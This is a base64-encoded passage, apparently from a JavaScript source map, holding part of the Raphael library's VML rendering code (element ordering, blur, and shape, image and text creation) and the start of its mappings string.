IGlmICh0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbaGFzXShrZXkpICYmIHBhcmFtc1toYXNdKGtleSkgJiYgUi5pcyh0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNba2V5XSwgXCJmdW5jdGlvblwiKSkge1xuICAgICAgICAgICAgICAgIHZhciBwYXIgPSB0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNba2V5XS5hcHBseSh0aGlzLCBbXS5jb25jYXQocGFyYW1zW2tleV0pKTtcbiAgICAgICAgICAgICAgICB0aGlzLmF0dHJzW2tleV0gPSBwYXJhbXNba2V5XTtcbiAgICAgICAgICAgICAgICBmb3IgKHZhciBzdWJrZXkgaW4gcGFyKSBpZiAocGFyW2hhc10oc3Via2V5KSkge1xuICAgICAgICAgICAgICAgICAgICBwYXJhbXNbc3Via2V5XSA9IHBhcltzdWJrZXldO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIC8vIHRoaXMucGFwZXIuY2FudmFzLnN0eWxlLmRpc3BsYXkgPSBcIm5vbmVcIjtcbiAgICAgICAgICAgIGlmIChwYXJhbXMudGV4dCAmJiB0aGlzLnR5cGUgPT0gXCJ0ZXh0XCIpIHtcbiAgICAgICAgICAgICAgICB0aGlzLnRleHRwYXRoLnN0cmluZyA9IHBhcmFtcy50ZXh0O1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgc2V0RmlsbEFuZFN0cm9rZSh0aGlzLCBwYXJhbXMpO1xuICAgICAgICAgICAgLy8gdGhpcy5wYXBlci5jYW52YXMuc3R5bGUuZGlzcGxheSA9IEU7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLnRvRnJvbnQgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICF0aGlzLnJlbW92ZWQgJiYgdGhpcy5ub2RlLnBhcmVudE5vZGUuYXBwZW5kQ2hpbGQodGhpcy5ub2RlKTtcbiAgICAgICAgdGhpcy5wYXBlciAmJiB0aGlzLnBhcGVyLnRvcCAhPSB0aGlzICYmIFIuX3RvZnJvbnQodGhpcywgdGhpcy5wYXBlcik7XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgZWxwcm90by50b0JhY2sgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQpIHtcbiAgICAgICAgICAgIHJldHVybiB0aGlzO1xuICAgICAgICB9XG4gICAgICAgIGlmICh0aGlzLm5vZGUucGFyZW50Tm9kZS5maXJzdENoaWxkICE9IHRoaXMubm9kZSkge1xuICAgICAgICAgICAgdGhpcy5ub2RlLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHRoaXMubm9kZSwgdGhpcy5ub2RlLnBhcmVudE5vZGUuZmlyc3RDaGlsZCk7XG4gICAgICAgICAgICBSLl90b2JhY2sodGhpcywgdGhpcy5wYXBlcik7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLmluc2VydEFmdGVyID0gZnVuY3Rpb24gKGVsZW1lbnQpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGVsZW1lbnQuY29uc3RydWN0b3IgPT0gUi5zdC5jb25zdHJ1Y3Rvcikge1xuICAgICAgICAgICAgZWxlbWVudCA9IGVsZW1lbnRbZWxlbWVudC5sZW5ndGggLSAxXTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoZWxlbWVudC5ub2RlLm5leHRTaWJsaW5nKSB7XG4gICAgICAgICAgICBlbGVtZW50Lm5vZGUucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUodGhpcy5ub2RlLCBlbGVtZW50Lm5vZGUubmV4dFNpYmxpbmcpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgZWxlbWVudC5ub2RlLnBhcmVudE5vZGUuYXBwZW5kQ2hpbGQodGhpcy5ub2RlKTtcbiAgICAgICAgfVxuICAgICAgICBSLl9pbnNlcnRhZnRlcih0aGlzLCBlbGVtZW50LCB0aGlzLnBhcGVyKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLmluc2VydEJlZm9yZSA9IGZ1bmN0aW9uIChlbGVtZW50KSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQpIHtcbiAgICAgICAgICAgIHJldHVybiB0aGlzO1xuICAgICAgICB9XG4gICAgICAgIGlmIChlbGVtZW50LmNvbnN0cnVjdG9yID09IFIuc3QuY29uc3RydWN0b3IpIHtcbiAgICAgICAgICAgIGVsZW1lbnQgPSBlbGVtZW50WzBdO1xuICAgICAgICB9XG4gICAgICAgIGVsZW1lbnQubm9kZS5wYXJlbnROb2RlLmluc2VydEJlZm9yZSh0aGlzLm5vZGUsIGVsZW1lbnQubm9kZSk7XG4gICAgICAgIFIuX2luc2VydGJlZm9yZSh0aGlzLCBlbGVtZW50LCB0aGlzLnBhcGVyKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLmJsdXIgPSBmdW5jdGlvbiAoc2l6ZSkge1xuICAgICAgICB2YXIgcyA9IHRoaXMubm9kZS5ydW50aW1lU3R5bGUsXG4gICAgICAgICAgICBmID0gcy5maWx0ZXI7XG4gICAgICAgIGYgPSBmLnJlcGxhY2UoYmx1cnJlZ2V4cCwgRSk7XG4gICAgICAgIGlmICgrc2l6ZSAhPT0gMCkge1xuICAgICAgICAgICAgdGhpcy5hdHRycy5ibHVyID0gc2l6ZTtcbiAgICAgICAgICAgIHMuZmlsdGVyID0gZiArIFMgKyBtcyArIFwiLkJsdXIocGl4ZWxyYWRpdXM9XCIgKyAoK3NpemUgfHwgMS41KSArIFwiKVwiO1xuICAgICAgICAgICAgcy5tYXJnaW4gPSBSLmZvcm1hdChcIi17MH1weCAwIDAgLXswfXB4XCIsIHJvdW5kKCtzaXplIHx8IDEuNSkpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcy5maWx0ZXIgPSBmO1xuICAgICAgICAgICAgcy5tYXJnaW4gPSAwO1xuICAgICAgICAgICAgZGVsZXRlIHRoaXMuYXR0cnMuYmx1cjtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuXG4gICAgUi5fZW5naW5lLnBhdGggPSBmdW5jdGlvbiAocGF0aFN0cmluZywgdm1sKSB7XG4gICAgICAgIHZhciBlbCA9IGNyZWF0ZU5vZGUoXCJzaGFwZVwiKTtcbiAgICAgICAgZWwuc3R5bGUuY3NzVGV4dCA9IGNzc0RvdDtcbiAgICAgICAgZWwuY29vcmRzaXplID0gem9vbSArIFMgKyB6b29tO1xuICAgICAgICBlbC5jb29yZG9yaWdpbiA9IHZtbC5jb29yZG9yaWdpbjtcbiAgICAgICAgdmFyIHAgPSBuZXcgRWxlbWVudChlbCwgdm1sKSxcbiAgICAgICAgICAgIGF0dHIgPSB7ZmlsbDogXCJub25lXCIsIHN0cm9rZTogXCIjMDAwXCJ9O1xuICAgICAgICBwYXRoU3RyaW5nICYmIChhdHRyLnBhdGggPSBwYXRoU3RyaW5nKTtcbiAgICAgICAgcC50eXBlID0gXCJwYXRoXCI7XG4gICAgICAgIHAucGF0aCA9IFtdO1xuICAgICAgICBwLlBhdGggPSBFO1xuICAgICAgICBzZXRGaWxsQW5kU3Ryb2tlKHAsIGF0dHIpO1xuICAgICAgICB2bWwuY2FudmFzICYmIHZtbC5jYW52YXMuYXBwZW5kQ2hpbGQoZWwpO1xuICAgICAgICB2YXIgc2tldyA9IGNyZWF0ZU5vZGUoXCJza2V3XCIpO1xuICAgICAgICBza2V3Lm9uID0gdHJ1ZTtcbiAgICAgICAgZWwuYXBwZW5kQ2hpbGQoc2tldyk7XG4gICAgICAgIHAuc2tldyA9IHNrZXc7XG4gICAgICAgIHAudHJhbnNmb3JtKEUpO1xuICAgICAgICByZXR1cm4gcDtcbiAgICB9O1xuICAgIFIuX2VuZ2luZS5yZWN0ID0gZnVuY3Rpb24gKHZtbCwgeCwgeSwgdywgaCwgcikge1xuICAgICAgICB2YXIgcGF0aCA9IFIuX3JlY3RQYXRoKHgsIHksIHcsIGgsIHIpLFxuICAgICAgICAgICAgcmVzID0gdm1sLnBhdGgocGF0aCksXG4gICAgICAgICAgICBhID0gcmVzLmF0dHJzO1xuICAgICAgICByZXMuWCA9IGEueCA9IHg7XG4gICAgICAgIHJlcy5ZID0gYS55ID0geTtcbiAgICAgICAgcmVzLlcgPSBhLndpZHRoID0gdztcbiAgICAgICAgcmVzLkggPSBhLmhlaWdodCA9IGg7XG4gICAgICAgIGEuciA9IHI7XG4gICAgICAgIGEucGF0aCA9IHBhdGg7XG4gICAgICAgIHJlcy50eXBlID0gXCJyZWN0XCI7XG4gICAgICAgIHJldHVybiByZXM7XG4gICAgfTtcbiAgICBSLl9lbmdpbmUuZWxsaXBzZSA9IGZ1bmN0aW9uICh2bWwsIHgsIHksIHJ4LCByeSkge1xuICAgICAgICB2YXIgcmVzID0gdm1sLnBhdGgoKSxcbiAgICAgICAgICAgIGEgPSByZXMuYXR0cnM7XG4gICAgICAgIHJlcy5YID0geCAtIHJ4O1xuICAgICAgICByZXMuWSA9IHkgLSByeTtcbiAgICAgICAgcmVzLlcgPSByeCAqIDI7XG4gICAgICAgIHJlcy5IID0gcnkgKiAyO1xuICAgICAgICByZXMudHlwZSA9IFwiZWxsaXBzZVwiO1xuICAgICAgICBzZXRGaWxsQW5kU3Ryb2tlKHJlcywge1xuICAgICAgICAgICAgY3g6IHgsXG4gICAgICAgICAgICBjeTogeSxcbiAgICAgICAgICAgIHJ4OiByeCxcbiAgICAgICAgICAgIHJ5OiByeVxuICAgICAgICB9KTtcbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9O1xuICAgIFIuX2VuZ2luZS5jaXJjbGUgPSBmdW5jdGlvbiAodm1sLCB4LCB5LCByKSB7XG4gICAgICAgIHZhciByZXMgPSB2bWwucGF0aCgpLFxuICAgICAgICAgICAgYSA9IHJlcy5hdHRycztcbiAgICAgICAgcmVzLlggPSB4IC0gcjtcbiAgICAgICAgcmVzLlkgPSB5IC0gcjtcbiAgICAgICAgcmVzLlcgPSByZXMuSCA9IHIgKiAyO1xuICAgICAgICByZXMudHlwZSA9IFwiY2lyY2xlXCI7XG4gICAgICAgIHNldEZpbGxBbmRTdHJva2UocmVzLCB7XG4gICAgICAgICAgICBjeDogeCxcbiAgICAgICAgICAgIGN5OiB5LFxuICAgICAgICAgICAgcjogclxuICAgICAgICB9KTtcbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9O1xuICAgIFIuX2VuZ2luZS5pbWFnZSA9IGZ1bmN0aW9uICh2bWwsIHNyYywgeCwgeSwgdywgaCkge1xuICAgICAgICB2YXIgcGF0aCA9IFIuX3JlY3RQYXRoKHgsIHksIHcsIGgpLFxuICAgICAgICAgICAgcmVzID0gdm1sLnBhdGgocGF0aCkuYXR0cih7c3Ryb2tlOiBcIm5vbmVcIn0pLFxuICAgICAgICAgICAgYSA9IHJlcy5hdHRycyxcbiAgICAgICAgICAgIG5vZGUgPSByZXMubm9kZSxcbiAgICAgICAgICAgIGZpbGwgPSBub2RlLmdldEVsZW1lbnRzQnlUYWdOYW1lKGZpbGxTdHJpbmcpWzBdO1xuICAgICAgICBhLnNyYyA9IHNyYztcbiAgICAgICAgcmVzLlggPSBhLnggPSB4O1xuICAgICAgICByZXMuWSA9IGEueSA9IHk7XG4gICAgICAgIHJlcy5XID0gYS53aWR0aCA9IHc7XG4gICAgICAgIHJlcy5IID0gYS5oZWlnaHQgPSBoO1xuICAgICAgICBhLnBhdGggPSBwYXRoO1xuICAgICAgICByZXMudHlwZSA9IFwiaW1hZ2VcIjtcbiAgICAgICAgZmlsbC5wYXJlbnROb2RlID09IG5vZGUgJiYgbm9kZS5yZW1vdmVDaGlsZChmaWxsKTtcbiAgICAgICAgZmlsbC5yb3RhdGUgPSB0cnVlO1xuICAgICAgICBmaWxsLnNyYyA9IHNyYztcbiAgICAgICAgZmlsbC50eXBlID0gXCJ0aWxlXCI7XG4gICAgICAgIHJlcy5fLmZpbGxwb3MgPSBbeCwgeV07XG4gICAgICAgIHJlcy5fLmZpbGxzaXplID0gW3csIGhdO1xuICAgICAgICBub2RlLmFwcGVuZENoaWxkKGZpbGwpO1xuICAgICAgICBzZXRDb29yZHMocmVzLCAxLCAxLCAwLCAwLCAwKTtcbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9O1xuICAgIFIuX2VuZ2luZS50ZXh0ID0gZnVuY3Rpb24gKHZtbCwgeCwgeSwgdGV4dCkge1xuICAgICAgICB2YXIgZWwgPSBjcmVhdGVOb2RlKFwic2hhcGVcIiksXG4gICAgICAgICAgICBwYXRoID0gY3JlYXRlTm9kZShcInBhdGhcIiksXG4gICAgICAgICAgICBvID0gY3JlYXRlTm9kZShcInRleHRwYXRoXCIpO1xuICAgICAgICB4ID0geCB8fCAwO1xuICAgICAgICB5ID0geSB8fCAwO1xuICAgICAgICB0ZXh0ID0gdGV4dCB8fCBcIlwiO1xuICAgICAgICBwYXRoLnYgPSBSLmZvcm1hdChcIm17MH0sezF9bHsyfSx7MX1cIiwgcm91bmQoeCAqIHpvb20pLCByb3VuZCh5ICogem9vbSksIHJvdW5kKHggKiB6b29tKSArIDEpO1xuICAgICAgICBwYXRoLnRleHRwYXRob2sgPSB0cnVlO1xuICAgICAgICBvLnN0cmluZyA9IFN0cih0ZXh0KTtcbiAgICAgICAgby5vbiA9IHRydWU7XG4gICAgICAgIGVsLnN0eWxlLmNzc1RleHQgPSBjc3NEb3Q7XG4gICAgICAgIGVsLmNvb3Jkc2l6ZSA9IHpvb20gKyBTICsgem9vbTtcbiAgICAgICAgZWwuY29vcmRvcmlnaW4gPSBcIjAgMFwiO1xuICAgICAgICB2YXIgcCA9IG5ldyBFbGVtZW50KGVsLCB2bWwpLFxuICAgICAgICAgICAgYXR0ciA9IHtcbiAgICAgICAgICAgICAgICBmaWxsOiBcIiMwMDBcIixcbiAgICAgICAgICAgICAgICBzdHJva2U6IFwibm9uZVwiLFxuICAgICAgICAgICAgICAgIGZvbnQ6IFIuX2F2YWlsYWJsZUF0dHJzLmZvbnQsXG4gICAgICAgICAgICAgICAgdGV4dDogdGV4dFxuICAgICAgICAgICAgfTtcbiAgICAgICAgcC5zaGFwZSA9IGVsO1xuICAgICAgICBwLnBhdGggPSBwYXRoO1xuICAgICAgICBwLnRleHRwYXRoID0gbztcbiAgICAgICAgcC50eXBlID0gXCJ0ZXh0XCI7XG4gICAgICAgIHAuYXR0cnMudGV4dCA9IFN0cih0ZXh0KTtcbiAgICAgICAgcC5hdHRycy54ID0geDtcbiAgICAgICAgcC5hdHRycy55ID0geTtcbiAgICAgICAgcC5hdHRycy53ID0gMTtcbiAgICAgICAgcC5hdHRycy5oID0gMTtcbiAgICAgICAgc2V0RmlsbEFuZFN0cm9rZShwLCBhdHRyKTtcbiAgICAgICAgZWwuYXBwZW5kQ2hpbGQobyk7XG4gICAgICAgIGVsLmFwcGVuZENoaWxkKHBhdGgpO1xuICAgICAgICB2bWwuY2FudmFzLmFwcGVuZENoaWxkKGVsKTtcbiAgICAgICAgdmFyIHNrZXcgPSBjcmVhdGVOb2RlKFwic2tld1wiKTtcbiAgICAgICAgc2tldy5vbiA9IHRydWU7XG4gICAgICAgIGVsLmFwcGVuZENoaWxkKHNrZXcpO1xuICAgICAgICBwLnNrZXcgPSBza2V3O1xuICAgICAgICBwLnRyYW5zZm9ybShFKTtcbiAgICAgICAgcmV0dXJuIHA7XG4gICAgfTtcbiAgICBSLl9lbmdpbmUuc2V0U2l6ZSA9IGZ1bmN0aW9uICh3aWR0aCwgaGVpZ2h0KSB7XG4gICAgICAgIHZhciBjcyA9IHRoaXMuY2FudmFzLnN0eWxlO1xuICAgICAgICB0aGlzLndpZHRoID0gd2lkdGg7XG4gICAgICAgIHRoaXMuaGVpZ2h0ID0gaGVpZ2h0O1xuICAgICAgICB3aWR0aCA9PSArd2lkdGggJiYgKHdpZHRoICs9IFwicHhcIik7XG4gICAgICAgIGhlaWdodCA9PSAraGVpZ2h0ICYmIChoZWlnaHQgKz0gXCJweFwiKTtcbiAgICAgICAgY3Mud2lkdGggPSB3aWR0aDtcbiAgICAgICAgY3MuaGVpZ2h0ID0gaGVpZ2h0O1xuICAgICAgICBjcy5jbGlwID0gXCJyZWN0KDAgXCIgKyB3aWR0aCArIFwiIFwiICsgaGVpZ2h0ICsgXCIgMClcIjtcbiAgICAgICAgaWYgKHRoaXMuX3ZpZXdCb3gpIHtcbiAgICAgICAgICAgIFIuX2VuZ2luZS5zZXRWaWV3Qm94LmFwcGx5KHRoaXMsIHRoaXMuX3ZpZXdCb3gpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgUi5fZW5naW5lLnNldFZpZXdCb3ggPSBmdW5jdGlvbiAoeCwgeSwgdywgaCwgZml0KSB7XG4gICAgICAgIFIuZXZlKFwicmFwaGFlbC5zZXRWaWV3Qm94XCIsIHRoaXMsIHRoaXMuX3ZpZXdCb3gsIFt4LCB5LCB3LCBoLCBmaXRdKTtcbiAgICAgICAgdmFyIHBhcGVyU2l6ZSA9IHRoaXMuZ2V0U2l6ZSgpLFxuICAgICAgICAgICAgd2lkdGggPSBwYXBlclNpemUud2lkdGgsXG4gICAgICAgICAgICBoZWlnaHQgPSBwYXBlclNpemUuaGVpZ2h0LFxuICAgICAgICAgICAgSCwgVztcbiAgICAgICAgaWYgKGZpdCkge1xuICAgICAgICAgICAgSCA9IGhlaWdodCAvIGg7XG4gICAgICAgICAgICBXID0gd2lkdGggLyB3O1xuICAgICAgICAgICAgaWYgKHcgKiBIIDwgd2lkdGgpIHtcbiAgICAgICAgICAgICAgICB4IC09ICh3aWR0aCAtIHcgKiBIKSAvIDIgLyBIO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKGggKiBXIDwgaGVpZ2h0KSB7XG4gICAgICAgICAgICAgICAgeSAtPSAoaGVpZ2h0IC0gaCAqIFcpIC8gMiAvIFc7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgdGhpcy5fdmlld0JveCA9IFt4LCB5LCB3LCBoLCAhIWZpdF07XG4gICAgICAgIHRoaXMuX3ZpZXdCb3hTaGlmdCA9IHtcbiAgICAgICAgICAgIGR4OiAteCxcbiAgICAgICAgICAgIGR5OiAteSxcbiAgICAgICAgICAgIHNjYWxlOiBwYXBlclNpemVcbiAgICAgICAgfTtcbiAgICAgICAgdGhpcy5mb3JFYWNoKGZ1bmN0aW9uIChlbCkge1xuICAgICAgICAgICAgZWwudHJhbnNmb3JtKFwiLi4uXCIpO1xuICAgICAgICB9KTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICB2YXIgY3JlYXRlTm9kZTtcbiAgICBSLl9lbmdpbmUuaW5pdFdpbiA9IGZ1bmN0aW9uICh3aW4pIHtcbiAgICAgICAgICAgIHZhciBkb2MgPSB3aW4uZG9jdW1lbnQ7XG4gICAgICAgICAgICBpZiAoZG9jLnN0eWxlU2hlZXRzLmxlbmd0aCA8IDMxKSB7XG4gICAgICAgICAgICAgICAgZG9jLmNyZWF0ZVN0eWxlU2hlZXQoKS5hZGRSdWxlKFwiLnJ2bWxcIiwgXCJiZWhhdmlvcjp1cmwoI2RlZmF1bHQjVk1MKVwiKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgLy8gbm8gbW9yZSByb29tLCBhZGQgdG8gdGhlIGV4aXN0aW5nIG9uZVxuICAgICAgICAgICAgICAgIC8vIGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczUzMTE5NCUyOFZTLjg1JTI5LmFzcHhcbiAgICAgICAgICAgICAgICBkb2Muc3R5bGVTaGVldHNbMF0uYWRkUnVsZShcIi5ydm1sXCIsIFwiYmVoYXZpb3I6dXJsKCNkZWZhdWx0I1ZNTClcIik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB0cnkge1xuICAgICAgICAgICAgICAgICFkb2MubmFtZXNwYWNlcy5ydm1sICYmIGRvYy5uYW1lc3BhY2VzLmFkZChcInJ2bWxcIiwgXCJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOnZtbFwiKTtcbiAgICAgICAgICAgICAgICBjcmVhdGVOb2RlID0gZnVuY3Rpb24gKHRhZ05hbWUpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRvYy5jcmVhdGVFbGVtZW50KCc8cnZtbDonICsgdGFnTmFtZSArICcgY2xhc3M9XCJydm1sXCI+Jyk7XG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcbiAgICAgICAgICAgICAgICBjcmVhdGVOb2RlID0gZnVuY3Rpb24gKHRhZ05hbWUpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRvYy5jcmVhdGVFbGVtZW50KCc8JyArIHRhZ05hbWUgKyAnIHhtbG5zPVwidXJuOnNjaGVtYXMtbWljcm9zb2Z0LmNvbTp2bWxcIiBjbGFzcz1cInJ2bWxcIj4nKTtcbiAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgfVxuICAgICAgICB9O1xuICAgIFIuX2VuZ2luZS5pbml0V2luKFIuX2cud2luKTtcbiAgICBSLl9lbmdpbmUuY3JlYXRlID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB2YXIgY29uID0gUi5fZ2V0Q29udGFpbmVyLmFwcGx5KDAsIGFyZ3VtZW50cyksXG4gICAgICAgICAgICBjb250YWluZXIgPSBjb24uY29udGFpbmVyLFxuICAgICAgICAgICAgaGVpZ2h0ID0gY29uLmhlaWdodCxcbiAgICAgICAgICAgIHMsXG4gICAgICAgICAgICB3aWR0aCA9IGNvbi53aWR0aCxcbiAgICAgICAgICAgIHggPSBjb24ueCxcbiAgICAgICAgICAgIHkgPSBjb24ueTtcbiAgICAgICAgaWYgKCFjb250YWluZXIpIHtcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcIlZNTCBjb250YWluZXIgbm90IGZvdW5kLlwiKTtcbiAgICAgICAgfVxuICAgICAgICB2YXIgcmVzID0gbmV3IFIuX1BhcGVyLFxuICAgICAgICAgICAgYyA9IHJlcy5jYW52YXMgPSBSLl9nLmRvYy5jcmVhdGVFbGVtZW50KFwiZGl2XCIpLFxuICAgICAgICAgICAgY3MgPSBjLnN0eWxlO1xuICAgICAgICB4ID0geCB8fCAwO1xuICAgICAgICB5ID0geSB8fCAwO1xuICAgICAgICB3aWR0aCA9IHdpZHRoIHx8IDUxMjtcbiAgICAgICAgaGVpZ2h0ID0gaGVpZ2h0IHx8IDM0MjtcbiAgICAgICAgcmVzLndpZHRoID0gd2lkdGg7XG4gICAgICAgIHJlcy5oZWlnaHQgPSBoZWlnaHQ7XG4gICAgICAgIHdpZHRoID09ICt3aWR0aCAmJiAod2lkdGggKz0gXCJweFwiKTtcbiAgICAgICAgaGVpZ2h0ID09ICtoZWlnaHQgJiYgKGhlaWdodCArPSBcInB4XCIpO1xuICAgICAgICByZXMuY29vcmRzaXplID0gem9vbSAqIDFlMyArIFMgKyB6b29tICogMWUzO1xuICAgICAgICByZXMuY29vcmRvcmlnaW4gPSBcIjAgMFwiO1xuICAgICAgICByZXMuc3BhbiA9IFIuX2cuZG9jLmNyZWF0ZUVsZW1lbnQoXCJzcGFuXCIpO1xuICAgICAgICByZXMuc3Bhbi5zdHlsZS5jc3NUZXh0ID0gXCJwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0Oi05OTk5ZW07dG9wOi05OTk5ZW07cGFkZGluZzowO21hcmdpbjowO2xpbmUtaGVpZ2h0OjE7XCI7XG4gICAgICAgIGMuYXBwZW5kQ2hpbGQocmVzLnNwYW4pO1xuICAgICAgICBjcy5jc3NUZXh0ID0gUi5mb3JtYXQoXCJ0b3A6MDtsZWZ0OjA7d2lkdGg6ezB9O2hlaWdodDp7MX07ZGlzcGxheTppbmxpbmUtYmxvY2s7cG9zaXRpb246cmVsYXRpdmU7Y2xpcDpyZWN0KDAgezB9IHsxfSAwKTtvdmVyZmxvdzpoaWRkZW5cIiwgd2lkdGgsIGhlaWdodCk7XG4gICAgICAgIGlmIChjb250YWluZXIgPT0gMSkge1xuICAgICAgICAgICAgUi5fZy5kb2MuYm9keS5hcHBlbmRDaGlsZChjKTtcbiAgICAgICAgICAgIGNzLmxlZnQgPSB4ICsgXCJweFwiO1xuICAgICAgICAgICAgY3MudG9wID0geSArIFwicHhcIjtcbiAgICAgICAgICAgIGNzLnBvc2l0aW9uID0gXCJhYnNvbHV0ZVwiO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKGNvbnRhaW5lci5maXJzdENoaWxkKSB7XG4gICAgICAgICAgICAgICAgY29udGFpbmVyLmluc2VydEJlZm9yZShjLCBjb250YWluZXIuZmlyc3RDaGlsZCk7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGNvbnRhaW5lci5hcHBlbmRDaGlsZChjKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICByZXMucmVuZGVyZml4ID0gZnVuY3Rpb24gKCkge307XG4gICAgICAgIHJldHVybiByZXM7XG4gICAgfTtcbiAgICBSLnByb3RvdHlwZS5jbGVhciA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgUi5ldmUoXCJyYXBoYWVsLmNsZWFyXCIsIHRoaXMpO1xuICAgICAgICB0aGlzLmNhbnZhcy5pbm5lckhUTUwgPSBFO1xuICAgICAgICB0aGlzLnNwYW4gPSBSLl9nLmRvYy5jcmVhdGVFbGVtZW50KFwic3BhblwiKTtcbiAgICAgICAgdGhpcy5zcGFuLnN0eWxlLmNzc1RleHQgPSBcInBvc2l0aW9uOmFic29sdXRlO2xlZnQ6LTk5OTllbTt0b3A6LTk5OTllbTtwYWRkaW5nOjA7bWFyZ2luOjA7bGluZS1oZWlnaHQ6MTtkaXNwbGF5OmlubGluZTtcIjtcbiAgICAgICAgdGhpcy5jYW52YXMuYXBwZW5kQ2hpbGQodGhpcy5zcGFuKTtcbiAgICAgICAgdGhpcy5ib3R0b20gPSB0aGlzLnRvcCA9IG51bGw7XG4gICAgfTtcbiAgICBSLnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIFIuZXZlKFwicmFwaGFlbC5yZW1vdmVcIiwgdGhpcyk7XG4gICAgICAgIHRoaXMuY2FudmFzLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQodGhpcy5jYW52YXMpO1xuICAgICAgICBmb3IgKHZhciBpIGluIHRoaXMpIHtcbiAgICAgICAgICAgIHRoaXNbaV0gPSB0eXBlb2YgdGhpc1tpXSA9PSBcImZ1bmN0aW9uXCIgPyBSLl9yZW1vdmVkRmFjdG9yeShpKSA6IG51bGw7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHRydWU7XG4gICAgfTtcblxuICAgIHZhciBzZXRwcm90byA9IFIuc3Q7XG4gICAgZm9yICh2YXIgbWV0aG9kIGluIGVscHJvdG8pIGlmIChlbHByb3RvW2hhc10obWV0aG9kKSAmJiAhc2V0cHJvdG9baGFzXShtZXRob2QpKSB7XG4gICAgICAgIHNldHByb3RvW21ldGhvZF0gPSAoZnVuY3Rpb24gKG1ldGhvZG5hbWUpIHtcbiAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgdmFyIGFyZyA9IGFyZ3VtZW50cztcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5mb3JFYWNoKGZ1bmN0aW9uIChlbCkge1xuICAgICAgICAgICAgICAgICAgICBlbFttZXRob2RuYW1lXS5hcHBseShlbCwgYXJnKTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIH07XG4gICAgICAgIH0pKG1ldGhvZCk7XG4gICAgfVxufSk7XG4iXSwibWFwcGluZ3MiOiJBQUFBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7Q